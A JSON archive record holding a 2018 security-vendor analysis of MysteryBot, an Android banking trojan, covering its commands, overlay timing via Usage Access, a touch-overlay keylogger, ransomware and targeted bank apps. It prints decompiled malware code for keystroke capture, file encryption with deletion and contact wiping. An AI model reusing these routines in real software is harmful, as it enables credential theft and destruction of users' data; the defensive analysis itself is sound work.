{
    "id": "c30cd844-207a-4195-88c3-dd9f510f64ec",
    "created_at": "2023-01-12T14:59:48.841839Z",
    "updated_at": "2025-03-27T02:05:27.009333Z",
    "deleted_at": null,
    "sha1_hash": "1214d89379b32b71d19fc5f8e5627b254c9adfe3",
    "title": "2018-06-01 - MysteryBot - A New Android Banking Trojan Ready For Android 7 and 8",
    "authors": "",
    "file_creation_date": "2022-05-28T23:38:38Z",
    "file_modification_date": "2022-05-28T23:38:38Z",
    "file_size": 432065,
    "plain_text": "# MysteryBot; a new Android banking Trojan ready for Android 7 and 8\n\n**[threatfabric.com/blogs/mysterybot__a_new_android_banking_trojan_ready_for_android_7_and_8.html](https://www.threatfabric.com/blogs/mysterybot__a_new_android_banking_trojan_ready_for_android_7_and_8.html)**\n\nJune 2018\n\n\n-----\n\n## Intro\n\nWhile processing our daily set of suspicious samples, our detection rule for the Android\nbanking trojan LokiBot matched a sample that seemed quite different than LokiBot itself,\nurging us to take a closer look at it. Looking at the bot commands, we first thought that\nLokiBot had been improved. However, we quickly realized that there is more going on: the\nname of the bot and the name of the panel changed to “MysteryBot”, even the network\ncommunication changed.\n\nDuring investigation of its network activity we found out that MysteryBot and LokiBot Android\nbanker are both running on the same C&C server. This quickly brought us to an early\nconclusion that this newly discovered Malware is either an update to Lokibot, either another\nbanking trojan developed by the same actor.\n\nTo consolidate evidence, we searched some other sources and found more matches\nbetween samples of both malware using the same C&C, as visible in following screenshot\nfrom [Koodous:](https://koodous.com/apks?search=network.hosts:89.42.211.24)\n\n\n-----\n\n_MysteryBot linked to LokiBot on Koodous_\n\n## Capabilities\n\nThis bot has most generic Android banking Trojan functionalities, but seems to be willing to\nsurpass the average. The overlay, key logging and ransomware functionalities are novel and\nare explained in detail in the section here-after. All of the bot commands and respectful\nfeatures are listed in the table below.\n\nCallToNumber Calls a given phone number from the infected device\n\nContacts Gets contact list information (phone number and name of contacts)\n\nDe_Crypt No code present, in development (probably decrypts the data /\nreverses the ransomware process)\n\nForwardCall Forwards incoming calls of the device to another number\n\nGetAlls Shortened for GetAllSms, copies all the SMS messages from the\ndevice\n\nGetMail No code present, in development (probably stealing emails from\nthe infected device)\n\nKeylogg Copies and saves keystrokes performed on the infected device\n\nResetCallForwarding Stops the forwarding of incoming calls\n\nScreenlock Encrypts all files in the external storage directory and deletes all\ncontact information on the device\n\n\n-----\n\nSend_spam Sends a given SMS message to each contact in the contact list of\nthe device\n\nSmsmnd Replaces the default SMS manager on the device, meant for SMS\ninterception\n\nStartApp No code present, in development (probably allows to remotely start\napplication on the infected device)\n\nUSSD Calls a USSD number from the infected device\n\ndell_sms Deletes all SMS messages on the device\n\nsend_sms Sends a given SMS message to a specific number\n\nThe following screenshot shows the dropdown list that enables the operator to launch\nspecific commands on the bot:\n\n_Screenshot of the command launcher_\n\n## Overlays module made ready for Android 7/8\n\nWith the introduction of the version 7 and 8 of Android, the previously used overlay\ntechniques were rendered inaccessible, forcing the financially motivated threat actors to find\na new way to use overlays in their banking malware. During the past three months, some of\nthe largest Android banking malware families, such as but not limited to: ExoBot 2.5, Anubis\nII, DiseaseBot, have been exploring new techniques to time the overlay attack correctly on\nAndroid 7 and 8.\n\n\n-----\n\nThe success of the overlay attacks relies on timing, luring the victim on a fake page asking of\ncredentials or credit card information at the moment the related app is opened by the victim.\nMistiming the overlay would make the overlay screen appear at an unexpected moment,\nresulting in the victim realizing presence of the malware. This has been made difficult with\nthe restrictions employed by Security-Enhanced Linux (SELinux) and other security controls\n(sandbox restrictions) in Android 7 and 8. Hence, actors have been working hard on finding\nnew ways to time overlays correctly, which resulted in many technical debates in the Android\nbanking trojan criminal ecosystem.\n\nA new technique has been conceived and is currently being used, it abuses the Android\n[PACKAGE_USAGE_STATS permission (commonly named Usage Access permission). The](https://developer.android.com/reference/android/app/usage/UsageStatsManager)\ncode of MysteryBot, has been consolidated with the so-called PACKAGE_USAGE_STATS\ntechnique. Because abusing this Android permissions requires the victim to provide the\n[permissions for usage, MysteryBot employs the popular AccessibilityService, allowing the](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService)\nTrojan to enable and abuse any required permission without the consent of the victim.\n\n[Experience has shown us that users often grant application Device Administrator and](https://developer.android.com/guide/topics/admin/device-admin)\n[AccessibilityService permissions, empowering the malware to perform further actions on the](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService)\ninfected device. It seems that the reason for the victims to grant such permissions and the\nnumber of benign apps nowadays asking for exhaustive sets of permissions, making it\ncommon for users to grant permissions without reviewing the permissions requested. At the\nmoment MysteryBot is not using such MO to get the Usage Access permission, but will ask\nthe victim or it directly.\n\nThe screenshot below shows the malware (hidden as a fake Adobe Flash Player application)\nonce installed, listed with the applications requesting the Usage Access permission. Once\nthe victim is triggered into providing the permission, the status of the malicious app will be\nchange to “On”.\n\n\n-----\n\n_Screenshot of the apps requesting Usage Access permission_\n\nWhile performing the investigation of this new technique we recreated the logic used by the\nactors to detect the app in the foreground to confirm that abuse of this permission would\nallow overlays to work. The test resulted positively, we could indeed get the package name\nof the application in the foreground. The screenshot below shows that on our test device the\napplication with the package name au.com.nab.mobile (NAB Mobile Banking) is in the\nforeground, which worked on both Android 7 and 8.\n\n_List of foreground apps obtained by the malware_\n\nThis is a snippet of the code that is used by the bot to obtain the package name of the app\nused the latest: getLastUsedApplication()\n\n\n-----\n\n```\n@TargetApi(value 21)\npublic void getLastUsedApplication() {\n  try {\n    do {\n      label_0:\n      TimeUnit.MILLISECONDS.sleep(1000);\n      gotolabel_8;\n    } while (true);\n  } catch (InterruptedException interruptedException) {\n    try {\n      interruptedException.printStackTrace();\n      label_8:\n      Object usageStatsManager = this.getSystemService(\"usagestats\");\n      long epochTime = System.currentTimeMillis();\n      List usageStatsList = ((UsageStatsManager)\nusageStatsManager).queryUsageStats(0, epochTime - 10000, epochTime);\n      if (usageStatsList == null || usageStatsList.size() <= 0) {\n        gotolabel_0;\n      }\n      TreeMap sortedMap = new TreeMap();\n      Iterator usageStatsListIterator = usageStatsList.iterator();\n      while (usageStatsListIterator.hasNext()) {\n        Object usageStats = usageStatsListIterator.next();\n        ((SortedMap) sortedMap).put(Long.valueOf(((UsageStats)\nusageStats).getLastTimeUsed()), usageStats);\n      }\n      if (((SortedMap) sortedMap).isEmpty()) {\n        gotolabel_0;\n      }\n      String packageName = ((SortedMap) sortedMap).get(((SortedMap)\nsortedMap).lastKey()).getPackageName();\n      PrintStream printStream = System.out;\n      StringBuilder output = new StringBuilder().insert(0,\n\"Total:================ \"));\n      output.append(packageName);\n      printStream.println(output.toString());\n      gotolabel_0;\n    } catch (Exception ex) {\n      ex.printStackTrace();\n      return;\n    }\n  }\n}\n\n```\nKey logging based on touch data (new) ————————————\nUpon analyzing the keylogger functionality, it struck us as odd that none of the known\nkeylogging techniques were used. The two other well-known Android banking Trojans\nembedding a keylogging module (CryEye and Anubis) do abuse the Android Accessibility\n\n\n-----\n\nService to log the keystrokes or make screenshots upon keypresses; however, this\ntechnique requires the victim to grant Accessibility Service permission after installing the\nmalware (hence requiring more user interaction to be successful).\n\nMysteryBot seems to use a new and innovative technique to log keystrokes. It considers that\neach key of the keyboard has a set location on the screen, on any given phone and\nregardless if the phone is in held horizontally or vertically, it also takes into consideration that\neach key has the same size and therefore is the same number of pixels away from the\nprevious key. To summarize, it looks like this technique calculates the location for each row\nand places a View over each key. This view has a width and height of 0 pixels and due to the\n“FLAG_SECURE” setting used, the views are not visible in screenshots. Each view is then\npaired to a specific key in such a way that it can register the keys that have been pressed\nwhich are then saved for further use.\n\nAt the time of writing, the code for this the keylogger seems to still be under development as\nthere is no method yet to send the logs to the C2 server.\n\nThis code snippet shows the function used to record the keystrokes. Note that the ycoordinate for each layer is set, whilst the x coordinate of each layer is multiplied by value of\nthe current iteration (because the layout of whole row of keys only differs on the x-axis).\nrecordKeystrokes\n\n\n-----\n\n```\nfor (i 0; true; ++i) {\n   int10 = 10;\n   int0x800053 = 0x800053;\n   if (i >= this.keyboardLayer0.length) {\n     break;\n   }\n  this.keyboardLayer0\\[i\\] = View.inflate(((Context) this), resource, viewGroup);\n   windowManager = new WindowManager$LayoutParams(this.x / 10, 50, 2003, 0x40018,\n-3);\n   this.keyboardLayer0\\[i\\].setOnTouchListener(new HandleKeystrokeLayer0(this));\n   windowManager.gravity = int0x800053;\n   windowManager.x = this.x / int10 * i;\n   windowManager.y = 0xFA;\n   this.systemServiceWindow.addView(this.keyboardLayer0\\[i\\],\n((ViewGroup$LayoutParams) windowManager));\n }\nfor (i = 0; i < this.keyboardLayer1.length; ++i) {\n   this.keyboardLayer1\\[i\\] = View.inflate(((Context) this), resource, viewGroup);\n   windowManager = new WindowManager$LayoutParams(this.x / 9, 50, 2003, 0x40018,\n-3);\n   this.keyboardLayer1\\[i\\].setOnTouchListener(new HandleKeystrokeLayer1(this));\n   windowManager.gravity = int0x800053;\n   windowManager.x = this.x / 9 * i;\n   windowManager.y = 170;\n   this.systemServiceWindow.addView(this.keyboardLayer1\\[i\\],\n((ViewGroup$LayoutParams) windowManager));\n }\nfor (i = 0; i < this.keyboardLayer2.length; ++i) {\n   this.keyboardLayer2\\[i\\] = View.inflate(((Context) this), resource, viewGroup);\n   windowManager = new WindowManager$LayoutParams(this.x / 9, 50, 2003, 0x40018,\n-3);\n   this.keyboardLayer2\\[i\\].setOnTouchListener(new HandleKeystrokeLayer2(this));\n   windowManager.gravity = int0x800053;\n   windowManager.x = this.x / 9 * i;\n   windowManager.y = 90;\n   this.systemServiceWindow.addView(this.keyboardLayer2\\[i\\],\n((ViewGroup$LayoutParams) windowManager));\n }\nwhile (j < this.keyboardLayer3.length) {\n   this.keyboardLayer3\\[j\\] = View.inflate(((Context) this), resource, viewGroup);\n   i = 2;\n   int v4_1 = j == i ? this.x / 9 * 5 : this.x / 9;\n   int v8 = v4_1;\n   windowManager = new WindowManager$LayoutParams(v8, 50, 2003, 0x40018, -3);\n   this.keyboardLayer3\\[j\\].setOnTouchListener(new HandleKeystrokeLayer3(this));\n   windowManager.gravity = int0x800053;\n   i = j > i ? this.x / 9 * (j + 4) : this.x / 9 * j;\n   windowManager.x = i;\n   windowManager.y = int10;\n   this.systemServiceWindow.addView(this.keyboardLayer3\\[j\\],\n((ViewGroup$LayoutParams) windowManager));\n\n```\n\n-----\n\n```\n   ++j;\n}\n\n```\nThis code snippet shows the function used to save the keystrokes, residing in the\n“HandleKeystrokeLayerN” class. Note that if the value equals “4” it results in\n[“ACTION_OUTSIDE”, which is only activated when the user touches a location on the](https://developer.android.com/reference/android/view/MotionEvent.html#ACTION_OUTSIDE)\nscreen outside of the UI element (the view). Since the view is 0 by 0 pixels this should\nalways be true, but if this somehow differs the keystroke is not recorded.\n```\npublic boolean onTouch(View view, MotionEvent motionEvent) {\n  view.performClick();\n  if(motionEvent.getAction() == 4) {\n    Keylogger.setKeyStroke(this.keylogger,\nKeylogger.getMotionEventFlagTotal(this.keylogger) + motionEvent.getFlags());\n  }\n  return 0;\n}\n\n```\nThis code snippet shows if usage of the shift or alt key(s) is made, stored as Booleans as\ncan be seen in the method below. Since it uses an XOR value of itself, the value true is set to\nfalse and vice versa.\n```\nif(character.equals(\"alt\") {\n     Keylogger.setAltEnabled(this.keylogger, \nKeylogger.getIsAltEnabled(this.keylogger) ^ 1);\n   }\nif(character.equals(\"shift\") {\n      Keylogger.getShiftEnabled(this.keylogger, \nKeylogger.setShift(this.keylogger) ^ 1);\n    }\n\n```\nThis code snippet shows how the logged keystrokes are saved (using a simple check).\n```\nif (!character.equals(\"outside\") && !character.equals(\"symbols\") &&\n!character.equals(\"alt\") && !character.equals(\"misc\") && !character.equals(\"shift\")\n&& !character.equals(\"back\") && !character.equals(\"enter\") {\n  keylogger = this.keylogger;\n  currentStroke = new StringBuilder().insert(0,\nKeylogger.getCurrentStroke(this.keylogger));\n  currentStroke.append(character);\n  Keylogger.setCurrentStroke(keylogger, currentStroke.toString());\n}\n\n### Ransomware\n\n```\n\n-----\n\nThe locker/ransomware clients are managed from a separate dashboard dubbed\n“Myster_L0cker”, as visible in the screenshot below:\n\n_Screenshot of the interface used to manage the ransomware victims_\n\nMysteryBot also embeds a ransomware feature allowing itself to encrypt individually all files\nin the external storage directory, including every sub directory, after which the original files\nare deleted. The encryption process puts each file in an individual ZIP archive that is\npassword protected, the password is the same for all ZIP archives and is generated during\nruntime. When the encryption process is completed, the user is greeted with a dialog\naccusing the victim to have watched pornographic material. To retrieve the password and be\nable to decrypt the files the user is instructed to e-mail the actor on his e-mail address:\n\ngoogleprotect[at]mail.ru\n\nDuring the analysis of the ransomware functionality, two points of failure came out:\n\nFirstly, the password used during the encryption is only 8 characters long and consists\nof all characters of the Latin alphabet (upper and lower case) combined with numbers.\nThe total amount of characters to pick from is 62, leaving the total possible\ncombinations a total of 62 to the power of 8, which could be brute-forced with the\nrelevant processing power.\nSecondly, the ID assigned to each victim can be a number between 0 and 9999. Since\nthere is no verification of existing ID, it is possible that another victim with the same ID\nexists in the C2 database, overwriting the id in the C2 database. Resulting in the\nimpossibility for a older victims with duplicated ID to recover their files.\n\nThis code snippet shows the process used to generate the password used during the\nencryption: generatePassword()\n\n\n-----\n\n```\npublic static String generatePassword() {\n   Random random = new Random();\n   StringBuilder passwordLength8 = new StringBuilder();\n   String seed = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n   for (int i = 0; i < 8; i++) {\n     int characterLocation = random.nextInt(seed.length());\n     char currentChar = seed.charAt(characterLocation);\n     passwordLength8.append(currentChar);\n   }\n   return passwordLength8.toString();\n}\n\n```\nThis code snippet shows the code that recursively scans directories: scanDirectory()\n```\npublic void scanDirectory(File file) {\n  try {\n    File\\[\\] fileArray = file.listFiles();\n    if (fileArray == null) {\n      return;\n    }\n    int amountOfFiles = fileArray.length;\n    for (int i = 0; i < amountOfFiles; i++) {\n      File currentFile = fileArray\\[i\\];\n      if (currentFile.isDirectory()) {\n        this.scanDirectory(currentFile);\n      } else {\n        this.deleteFileEncryptInZip(currentFile);\n      }\n    }\n  } catch (Exception ex) {\n    ex.printStackTrace();\n  }\n}\n\n```\nThis code snippet shows the code used to encrypt a given directory: deleteFileEncryptInZip()\n\n\n-----\n\n```\npublic String  deleteFileEncryptInZip(File file) {\n     try {\n       StringBuilder  canonicalPath = new StringBuilder().insert(0, \nfile.getCanonicalPath());\n       canonicalPath.append(\".zip\");\n       ZipFile  zipFile = new ZipFile(canonicalPath.toString());\n       ArrayList  paths = new ArrayList();\n       paths.add(new File(String.valueOf(file)));\n       ZipParameters  zipParameters = new ZipParameters();\n       zipParameters.setCompressionMethod(8);\n       zipParameters.setCompressionLevel(5);\n       zipParameters.setEncryptFiles(true);\n       zipParameters.setEncryptionMethod(99);\n       zipParameters.setAesKeyStrength(3);\n       zipParameters.setPassword(this.password);\n       zipFile.addFiles(paths,  zipParameters);\n       file.delete();\n       StringBuilder  dblocksPath = new StringBuilder();\n       dblocksPath.append(Environment.getExternalStorageDirectory());\n       dblocksPath.append(\"/dblocks.txt\");\n       BufferedWriter  bufferedWriter = new BufferedWriter(new FileWriter(new\nFile(dblocksPath.toString()),  true));\n       bufferedWriter.write(\"+1\\\\n\");\n       bufferedWriter.close();\n     } catch (Exception ex) {\n       ex.printStackTrace();\n     }\n     return \"\";\n   }\n\n```\nThis code snippet shows the deletion of all the contacts: deleteContacts()\n```\nprivate void deleteContacts() {\n  ContentResolver contentResolver = this.getContentResolver();\n  Cursor contacts = contentResolver.query(ContactsContract$Contacts.CONTENT_URI,\nnull, null, null, null);\n  while(contacts.moveToNext()) {\n    try {\n      contentResolver.delete(Uri.withAppendedPath(ContactsContract$Contacts.CONT\ncontacts.getString(contacts.getColumnIndex(LL.LLdecrypt(\"\\\\u0007M\\\\u0004I\\\\u001ER\"))))\n null, null); // lookup\n    }\n    catch(Exception ex) {\n      System.out.println(ex.getStackTrace());\n    }\n  }\n  new ScanAndEncryptAsync(this).execute(new Integer\\[\\]{Integer.valueOf(1)});\n}\n\n### Overlay targets\n\n```\n\n-----\n\nThe get_inj_list action retrieves the targeted apps with overlays from the C&C server, note\nthat at the time of writing the actor was extending and further developing this overlay action\nclass.\n\nThe list of actual targeted apps is visible hereunder (still under development at the time of\nwriting):\n\n**Package name** **Related Bank**\n\nat.easybank.mbanking Easybank\n\nat.volksbank.volksbankmobile VolksbankBanking\n\nau.com.bankwest.mobile Bankwest\n\nau.com.ingdirect.android INGAustraliaBanking\n\nau.com.nab.mobile NABMobileBanking\n\nau.com.suncorp.SuncorpBank SuncorpBank\n\ncom.IngDirectAndroid INGDirectFrance\n\ncom.advantage.RaiffeisenBank RaiffeisenSmartMobile\n\ncom.akbank.android.apps.akbank_direkt AkbankDirekt\n\ncom.anz.android.gomoney ANZAustralia\n\ncom.aol.mobile.aolapp AOL-News,Mail&Video\n\ncom.axis.mobile AxisMobileFundTransfer,UPI,Recharge&Payment\n\ncom.bankaustria.android.olb BankAustriaMobileBanking\n\ncom.bankinter.launcher BankinterMóvil\n\ncom.bbva.bbvacontigo BBVA Spain\n\ncom.bbva.netcash BBVANetcash PT\n\ncom.bendigobank.mobile BendigoBank\n\ncom.boursorama.android.clients BoursoramaBanque\n\ncom.caisseepargne.android.mobilebanking Banque\n\ncom.chase.sig.android ChaseMobile\n\ncom.cibc.android.mobi CIBCMobileBanking®\n\n\n-----\n\n**Package name** **Related Bank**\n\ncom.cic_prod.bad CIC\n\ncom.citibank.mobile.au CitibankAustralia\n\ncom.clairmail.fth FifthThirdMobileBanking\n\ncom.cm_prod.bad CréditMutuel\n\ncom.commbank.netbank CommBank\n\ncom.csam.icici.bank.imobile iMobilebyICICIBank\n\ncom.ebay.gumtree.au Gumtree:Search,Buy&Sell\n\ncom.facebook.katana Facebook\n\ncom.facebook.orca Messenger–TextandVideoChatforFree\n\ncom.finansbank.mobile.cepsube QNBFinansbankCepŞubesi\n\ncom.fullsix.android.labanquepostale.accountaccess LaBanquePostale\n\ncom.garanti.cepsubesi GarantiMobileBanking\n\ncom.getingroup.mobilebanking GetinMobile\n\ncom.grppl.android.shell.CMBlloydsTSB73 LloydsBankMobileBanking\n\ncom.grppl.android.shell.halifax Halifax:thebankingappthatgivesyouextra\n\ncom.htsu.hsbcpersonalbanking HSBCMobileBanking\n\ncom.infonow.bofa BankofAmericaMobileBanking\n\ncom.isis_papyrus.raiffeisen_pay_eyewdg RaiffeisenELBA\n\ncom.konylabs.capitalone CapitalOne®Mobile\n\ncom.konylabs.cbplpat CitiHandlowy\n\ncom.kutxabank.android Kutxabank\n\ncom.macif.mobile.application.android MACIF-Essentielpourmoi\n\ncom.microsoft.office.outlook MicrosoftOutlook\n\ncom.moneybookers.skrillpayments Skrill\n\ncom.moneybookers.skrillpayments.neteller NETELLER\n\ncom.ocito.cdn.activity.creditdunord CréditduNordpourMobile\n\n\n-----\n\n**Package name** **Related Bank**\n\ncom.paypal.android.p2pmobile PayPal\n\ncom.pozitron.iscep İşCep\n\ncom.rsi Ruralvía\n\ncom.sbi.SBIFreedomPlus SBIAnywherePersonal\n\ncom.skype.raider Skype-freeIM&videocalls\n\ncom.snapwork.hdfc HDFCBankMobileBanking\n\ncom.starfinanz.smob.android.sbanking Sparkasse+FinanzenimGriff\n\ncom.starfinanz.smob.android.sfinanzstatus SparkasseIhremobileFiliale\n\ncom.suntrust.mobilebanking SunTrustMobileApp\n\ncom.td TDCanada\n\ncom.tecnocom.cajalaboral BancaMóvilLaboralKutxa\n\ncom.tmobtech.halkbank HalkbankMobil\n\ncom.todo1.mobile BancolombiaAppPersonas\n\ncom.unionbank.ecommerce.mobile.android UnionBankMobileBanking\n\ncom.usaa.mobile.android.usaa USAAMobile\n\ncom.usbank.mobilebanking U.S.Bank\n\ncom.vakifbank.mobile VakıfBankMobilBankacılık\n\ncom.viber.voip ViberMessenger\n\ncom.whatsapp WhatsAppMessenger\n\ncom.yahoo.mobile.client.android.mail YahooMail–StayOrganized\n\ncom.ykb.android YapıKrediMobile\n\ncom.ziraat.ziraatmobil ZiraatMobil\n\nde.comdirect.android comdirectmobileApp\n\nde.commerzbanking.mobil CommerzbankBankingApp\n\nde.consorsbank Consorsbank\n\nde.dkb.portalapp DKB-Banking\n\n\n-----\n\n**Package name** **Related Bank**\n\nde.fiducia.smartphone.android.banking.vr VR-Banking\n\nde.postbank.finanzassistent PostbankFinanzassistent\n\nde.sdvrz.ihb.mobile.app SpardaApp\n\nes.bancopopular.nbmpopular Popular\n\nes.bancosantander.apps Santander\n\nes.cm.android Bankia\n\nes.evobanco.bancamovil EVOBancomóvil\n\nes.lacaixa.mobile.android.newwapicon CaixaBank\n\neu.eleader.mobilebanking.pekao BankPekao\n\neu.eleader.mobilebanking.pekao.firm PekaoBiznes24\n\neu.eleader.mobilebanking.raiffeisen MobileBank\n\neu.unicreditgroup.hvbapptan HVBMobileB@nking\n\nfr.banquepopulaire.cyberplus BanquePopulaire\n\nfr.creditagricole.androidapp MaBanque\n\nfr.lcl.android.customerarea MesComptes-LCLpourmobile\n\nhr.asseco.android.jimba.mUCI.ro MobileBanking\n\nin.co.bankofbaroda.mpassbook BarodamPassbook\n\nmobi.societegenerale.mobile.lappli AppliSociétéGénérale\n\nmobile.santander.de SantanderMobileBanking\n\nnet.bnpparibas.mescomptes MesComptesBNPParibas\n\norg.banksa.bank BankSAMobileBanking\n\norg.bom.bank BankofMelbourneMobileBanking\n\norg.stgeorge.bank St.GeorgeMobileBanking\n\norg.westpac.bank WestpacMobileBanking\n\npl.bzwbk.bzwbk24 BZWBK24mobile\n\npl.eurobank eurobankmobile\n\n\n-----\n\n**Package name** **Related Bank**\n\npl.ipko.mobile TokeniPKO\n\npl.mbank mBankPL\n\npl.pkobp.iko IKO\n\nro.btrl.mobile BancaTransilvania\n\nsrc.com.idbi IDBIBankGOMobile\n\nwit.android.bcpBankingApp.millenniumPL BankMillennium\n\n### Conclusion\n\nAlthough certain Android banking malware families such as but not limited to ExoBot 2.5,\nAnubis II, DiseaseBot have been exploring new techniques to perform overlay attacks on\nAndroid 7 and 8, it seems that the actor(s) behind MysteryBot have successfully\nimplemented a workaround solution and have spent some time on innovation. The\nimplementation of the overlay attack abuses the Usage Access permission in order to run on\nall version of the Android operating system including the latest Android 7 and 8.\n\nMysteryBot actor(s) did innovate keylogging with this new implementation. Effectively\nlowering detection rates and limiting the user interaction required to enable the logger.\nIndeed, the key logging mechanism is based on touch points on the screen instead of using\nthe commonly abused Android Accessibility Service, meaning that it has potential to log\nmore than the usually keystrokes. The ransomware also includes a new highly annoying\ncapability that deletes the contacts in the contact list of the infected device, something not\nobserved in banking malware till now. Next to that, although still in development another\nfunction caught our attention, based on the naming convention in use, it seems that the\nfunction named GetMail is meant to collect email messages from the infected device. The\nenhanced overlay attacks also running on the latest Android versions combined with\nadvanced keylogging and the potential under-development features will allow MysteryBot to\nharvest a broad set of Personal Identifiable Information in order to perform fraud.\n\nIn the last 6 months we observed that capabilities such as a proxy, keylogging, remote\naccess (RAT), sound recording and file uploading have become more and more common; we\nsuspect this trend to only grow in the future. The issue with such functionalities is that\nbesides bypassing security and detection measures, those features make threats less\ntargeting but more opportunistic. For example, keylogging, remote access, file upload and\nsound recording allow for advanced information harvesting without specific triggers\n(information can be stolen and recorded even if the victim doesn’t perform online banking). If\n\n\n-----\n\nour expectation of increase in such behavior turns out to be true, it means that it will become\ndifficult for financial institutions to asses whether or not they are target by the specific threats\nand that all infected devices can be source of fraud and espionage.\n\n### IOC\n\nPlease note that MysteryBot is still under development at the time of writing and not widely\nspread.\n\nAdobe Flash Player (install.apps)\n334f1efd0b347d54a418d1724d51f8451b7d0bebbd05f648383d05c00726a7ae\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-06-01 - MysteryBot - A New Android Banking Trojan Ready For Android 7 and 8.pdf"
    ],
    "report_names": [
        "2018-06-01 - MysteryBot - A New Android Banking Trojan Ready For Android 7 and 8.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535588,
    "ts_updated_at": 1743041127,
    "ts_creation_date": 1653781118,
    "ts_modification_date": 1653781118,
    "files": {
        "pdf": "https://archive.orkl.eu/1214d89379b32b71d19fc5f8e5627b254c9adfe3.pdf",
        "text": "https://archive.orkl.eu/1214d89379b32b71d19fc5f8e5627b254c9adfe3.txt",
        "img": "https://archive.orkl.eu/1214d89379b32b71d19fc5f8e5627b254c9adfe3.jpg"
    }
}